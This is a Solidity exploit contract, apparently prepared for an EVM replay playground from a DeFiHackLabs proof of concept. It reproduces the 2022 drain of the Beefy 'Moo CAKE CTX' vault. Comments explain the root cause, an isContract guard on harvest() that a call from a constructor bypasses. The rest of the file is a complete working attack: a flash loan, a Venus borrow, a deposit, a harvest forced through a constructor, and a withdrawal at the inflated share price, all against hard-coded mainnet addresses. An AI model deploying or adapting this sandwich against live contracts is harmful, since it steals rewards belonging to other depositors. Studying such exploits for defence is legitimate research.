// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-MooCAKECTX).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest` (the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself, and a one-shot `Harvest` contract is `new`'d mid-attack to bypass the
// strategy's `!isContract(msg.sender)` guard from a constructor). There is therefore
// no standalone contract to deploy in the original test. This file is a faithful,
// self-contained copy of that inline attack so the playground can deploy it and
// record `run()`. Logic and constants are copied verbatim from
// test/MooCAKECTX_exp.sol (only the `vm.deal`-funded 3 ether seed is supplied by the
// recorder's setup.fundAttackerWei instead of a `payable` constructor).
//
// Root cause: the Beefy "Moo CAKE CTX" vault prices shares off
// `strategy.balanceOf()`, which jumps discontinuously when the strategy's
// permissionless `harvest()` compounds a large batch of accrued rewards. `harvest()`
// is gated only by `require(!Address.isContract(msg.sender))`, which a contract can
// trivially bypass by calling it from its own CONSTRUCTOR (extcodesize is 0
// mid-construction). The attacker sandwiches a deposit -> harvest -> withdraw in one
// transaction, capturing ~29,913 CAKE of rewards that belonged to honest depositors.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external view returns (address);
    function WETH() external view returns (address);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata vTokens) external;
}

interface IVBUSD {
    function mint(uint256 mintAmount) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface IVCAKE {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
}

interface IBeefyVault {
    function depositAll() external;
    function withdrawAll() external;
}

interface IStrategySyrup {
    function harvest() external;
}

// One-shot harvester: calling strategy.harvest() from its constructor makes
// extcodesize(msg.sender) == 0, so the strategy's `!isContract` guard passes.
contract Harvest {
    constructor() {
        IStrategySyrup(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b).harvest();
    }
}

contract MooCAKECTXDrain {
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant CTK = IERC20(0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant CAKE = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);

    IVBUSD constant vBUSD = IVBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    IVCAKE constant vCAKE = IVCAKE(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUnitroller constant unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IBeefyVault constant beefyVault = IBeefyVault(0x489afbAED0Ea796712c9A6d366C16CA3876D8184);

    address constant DODO = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address constant SmartChef = 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892;

    function run() external payable {
        // Step 1 — wrap 3 BNB (recorder funds this contract with 3 ether via setup)
        WBNB.deposit{value: 3 ether}();

        // Step 2 — swap WBNB -> CTK to pre-inflate the SmartChef reward
        _wbnbToCTK();

        // Step 3 — donate the CTK into the SmartChef
        CTK.transfer(SmartChef, CTK.balanceOf(address(this)));

        // Step 4 — DODO flash loan 400,000 BUSD; the callback does the sandwich
        IDVM(DODO).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // Borrow working CAKE against the flash-loaned BUSD via Venus
        address[] memory cTokens = new address[](2);
        cTokens[0] = address(vBUSD);
        cTokens[1] = address(vCAKE);
        unitroller.enterMarkets(cTokens);
        BUSD.approve(address(vBUSD), type(uint256).max);
        vBUSD.mint(BUSD.balanceOf(address(this)));
        vCAKE.borrow(50_000 * 1e18);

        // Deposit at the LOW pre-harvest price
        CAKE.approve(address(beefyVault), type(uint256).max);
        beefyVault.depositAll();

        // Force the harvest from a constructor (bypasses !isContract guard)
        new Harvest();

        // Withdraw at the HIGH post-harvest price
        beefyVault.withdrawAll();

        // Unwind the Venus borrow + redeem the BUSD collateral
        CAKE.approve(address(vCAKE), type(uint256).max);
        vCAKE.repayBorrow(50_000 * 1e18);
        vBUSD.redeemUnderlying(400_000 * 1e18);

        // Repay the DODO flash loan
        BUSD.transfer(DODO, 400_000 * 1e18);
    }

    function _wbnbToCTK() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(CTK);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
